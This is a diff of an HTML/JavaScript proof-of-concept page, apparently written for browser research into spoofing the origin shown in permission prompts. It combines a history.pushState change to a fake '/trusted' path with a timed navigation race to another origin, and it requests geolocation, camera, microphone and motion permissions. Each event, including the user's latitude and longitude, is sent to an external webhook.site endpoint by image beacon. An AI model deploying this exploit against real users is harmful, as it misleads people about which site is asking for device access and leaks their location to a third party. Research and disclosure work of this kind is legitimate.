@@ -2,210 +2,621 @@
 <html>
 <head>
 <meta charset="utf-8">
+<title>Permission Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC Camera Permission Research</title>
 
 <style>
 body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #f5f5f7;
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
 }
 
 button {
-  font-size: 15px;
-  padding: 12px 18px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: white;
-  cursor: pointer;
-  font-weight: 600;
-}
-
-button:active {
-  background: #0056b3;
+  font-size:15px;
+  padding:10px 14px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:white;
+  margin:5px;
 }
 
 #panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: white;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.15);
-  text-align: center;
+  display:none;
+  max-width:420px;
+  margin:80px auto;
+  background:white;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+  text-align:center;
 }
 
 .notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
 }
 
-video {
-  margin-top: 16px;
-  width: 100%;
-  border-radius: 12px;
-  background: #000;
+pre {
+  text-align:left;
+  font-size:12px;
+  background:#eee;
+  padding:10px;
+  border-radius:8px;
 }
 </style>
+
 </head>
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-    <button id="trigger">Start PoC</button>
+
+<div style="text-align:center;margin-top:60px;">
+<button id="trigger">
+Start PoC
+</button>
 </div>
+
+
 
 <div id="panel">
 
-<h2>Request Camera</h2>
+<h2>Permission Test</h2>
 
-<p>Tap the button below to request Camera permission.</p>
+<p>
+Current URL:
+<br>
+<span id="url"></span>
+</p>
 
-<button onclick="getCamera()">Open Camera</button>
 
-<p id="output">Camera: -</p>
+<button onclick="getLocation()">
+Geolocation
+</button>
 
-<video id="preview" autoplay playsinline muted></video>
+
+<button onclick="getCameraMic()">
+Camera + Mic
+</button>
+
+
+<button onclick="getMotion()">
+Motion
+</button>
+
+
+<button onclick="getOrientation()">
+Orientation
+</button>
+
+
+
+<p id="output">
+Result: -
+</p>
+
+
+<pre id="logbox"></pre>
+
 
 <div class="notice">
-Demo only — observe origin shown in permission dialog.
+Demo only. Observe permission origin shown by browser.
 </div>
 
+
 </div>
+
+
 
 <script>
 
-const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-function logEvent(type, extra = {}) {
+const LOG_ENDPOINT =
+"https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-    const data = {
-        type,
-        ts: performance.now().toFixed(3),
-        epoch: Date.now(),
-        url: location.href,
-        origin: location.origin,
-        visibility: document.visibilityState,
-        readyState: document.readyState,
-        ...extra
-    };
 
-    const img = new Image();
 
-    img.src =
-        LOG_ENDPOINT +
-        "?" +
-        new URLSearchParams(data).toString();
-}
+function logEvent(type, extra={}) {
 
-const panel = document.getElementById("panel");
-const trigger = document.getElementById("trigger");
-const output = document.getElementById("output");
-const preview = document.getElementById("preview");
 
-async function getCamera() {
+const data = {
 
-    if (!navigator.mediaDevices ||
-        !navigator.mediaDevices.getUserMedia) {
+type,
 
-        output.textContent =
-            "Camera API not supported";
+ts:performance.now().toFixed(3),
 
-        return;
-    }
+epoch:Date.now(),
 
-    logEvent("camera_requested");
+url:location.href,
 
-    try {
+origin:location.origin,
 
-        const stream =
-            await navigator.mediaDevices.getUserMedia({
-                video: true
-            });
+visibility:document.visibilityState,
 
-        logEvent("camera_success", {
-            tracks: stream.getVideoTracks().length
-        });
+readyState:document.readyState,
 
-        preview.srcObject = stream;
-
-        output.textContent =
-            "Camera permission granted";
-
-        // hentikan kamera setelah 2 detik
-        setTimeout(() => {
-
-            stream.getTracks().forEach(track => track.stop());
-
-            preview.srcObject = null;
-
-            logEvent("camera_stopped");
-
-        }, 2000);
-
-    } catch (err) {
-
-        logEvent("camera_error", {
-            name: err.name,
-            message: err.message
-        });
-
-        output.textContent =
-            err.name;
-
-    }
-
-}
-
-trigger.onclick = () => {
-
-    logEvent("poc_started");
-
-    history.pushState({}, "", "/trusted_path_spoof");
-
-    logEvent("pushstate_done", {
-        newPath: location.pathname
-    });
-
-    panel.style.display = "block";
-    trigger.style.display = "none";
+...extra
 
 };
 
-window.addEventListener("pageshow", event => {
 
-    logEvent("pageshow", {
-        persisted: event.persisted
-    });
 
-    requestAnimationFrame(() => {
+const params =
+new URLSearchParams(data).toString();
 
-        requestAnimationFrame(() => {
 
-            setTimeout(() => {
 
-                const target =
-                    "https://google.com:9090";
+new Image().src =
+`${LOG_ENDPOINT}?${params}`;
 
-                logEvent("navigation_triggered", {
-                    target
-                });
 
-                location.href = target;
 
-            }, 50);
+const box =
+document.getElementById("logbox");
 
-        });
 
-    });
+if(box){
+
+box.textContent +=
+JSON.stringify(data,null,2)
++
+"\n\n";
+
+}
+
+}
+
+
+
+
+const panel =
+document.getElementById("panel");
+
+
+const trigger =
+document.getElementById("trigger");
+
+
+const output =
+document.getElementById("output");
+
+
+
+
+/*
+==========================
+GEOLOCATION
+==========================
+*/
+
+
+function getLocation(){
+
+
+if(!navigator.geolocation){
+
+output.textContent =
+"Geolocation unavailable";
+
+return;
+
+}
+
+
+
+logEvent(
+"geolocation_requested"
+);
+
+
+
+navigator.geolocation.getCurrentPosition(
+
+
+pos=>{
+
+
+logEvent(
+"geolocation_success",
+{
+
+lat:pos.coords.latitude,
+
+lon:pos.coords.longitude
+
+}
+
+);
+
+
+
+output.textContent =
+`${pos.coords.latitude}, ${pos.coords.longitude}`;
+
+
+},
+
+
+
+err=>{
+
+
+logEvent(
+"geolocation_error",
+{
+code:err.code,
+message:err.message
+}
+
+);
+
+
+output.textContent =
+"Geolocation denied";
+
+
+}
+
+
+);
+
+
+}
+
+
+
+
+/*
+==========================
+CAMERA + MICROPHONE
+==========================
+*/
+
+
+async function getCameraMic(){
+
+
+logEvent(
+"camera_mic_requested"
+);
+
+
+
+try{
+
+
+const stream =
+await navigator.mediaDevices.getUserMedia({
+
+video:true,
+
+audio:true
 
 });
 
+
+
+logEvent(
+"camera_mic_success"
+);
+
+
+
+output.textContent =
+"Camera + Mic granted";
+
+
+
+stream.getTracks()
+.forEach(track=>track.stop());
+
+
+
+}
+
+catch(e){
+
+
+logEvent(
+"camera_mic_error",
+{
+message:e.message
+}
+
+);
+
+
+output.textContent =
+"Camera/Mic denied";
+
+
+}
+
+
+}
+
+
+
+
+/*
+==========================
+MOTION
+==========================
+*/
+
+
+async function getMotion(){
+
+
+logEvent(
+"motion_requested"
+);
+
+
+
+try{
+
+
+if(
+typeof DeviceMotionEvent !== "undefined" &&
+DeviceMotionEvent.requestPermission
+){
+
+
+const result =
+await DeviceMotionEvent.requestPermission();
+
+
+
+logEvent(
+"motion_result",
+{
+result
+}
+);
+
+
+
+output.textContent =
+"Motion: "+result;
+
+
+}
+
+else{
+
+
+logEvent(
+"motion_not_supported"
+);
+
+
+output.textContent =
+"Motion unsupported";
+
+
+}
+
+
+}
+
+catch(e){
+
+
+logEvent(
+"motion_error",
+{
+message:e.message
+}
+
+);
+
+
+}
+
+
+}
+
+
+
+
+/*
+==========================
+ORIENTATION
+==========================
+*/
+
+
+async function getOrientation(){
+
+
+logEvent(
+"orientation_requested"
+);
+
+
+
+try{
+
+
+if(
+typeof DeviceOrientationEvent !== "undefined" &&
+DeviceOrientationEvent.requestPermission
+){
+
+
+const result =
+await DeviceOrientationEvent.requestPermission();
+
+
+
+logEvent(
+"orientation_result",
+{
+result
+}
+);
+
+
+
+output.textContent =
+"Orientation: "+result;
+
+
+
+}
+
+else{
+
+
+logEvent(
+"orientation_not_supported"
+);
+
+
+output.textContent =
+"Orientation unsupported";
+
+
+}
+
+
+}
+
+catch(e){
+
+
+logEvent(
+"orientation_error",
+{
+message:e.message
+}
+
+);
+
+
+}
+
+
+}
+
+
+
+
+
+/*
+==========================
+STEP 1
+KEEP ORIGINAL LOGIC
+==========================
+*/
+
+
+trigger.onclick = ()=>{
+
+
+logEvent(
+"poc_started"
+);
+
+
+
+history.pushState(
+{},
+"",
+"/trusted"
+);
+
+
+
+logEvent(
+"pushstate_done",
+{
+newPath:location.pathname
+}
+
+);
+
+
+
+document.getElementById("url")
+.textContent =
+location.href;
+
+
+
+panel.style.display =
+"block";
+
+
+};
+
+
+
+
+
+/*
+==========================
+STEP 2
+NAVIGATION RACE
+KEEP ORIGINAL LOGIC
+==========================
+*/
+
+
+window.addEventListener(
+"pageshow",
+()=>{
+
+
+logEvent(
+"pageshow"
+);
+
+
+
+requestAnimationFrame(()=>{
+
+
+requestAnimationFrame(()=>{
+
+
+setTimeout(()=>{
+
+
+logEvent(
+"navigation_triggered",
+{
+target:"https://google.com:9090"
+}
+
+);
+
+
+
+location.href =
+"https://google.com:9090";
+
+
+
+},80);
+
+
+
+});
+
+
+});
+
+
+});
+
+
+
 </script>
+
 
 </body>
 </html>
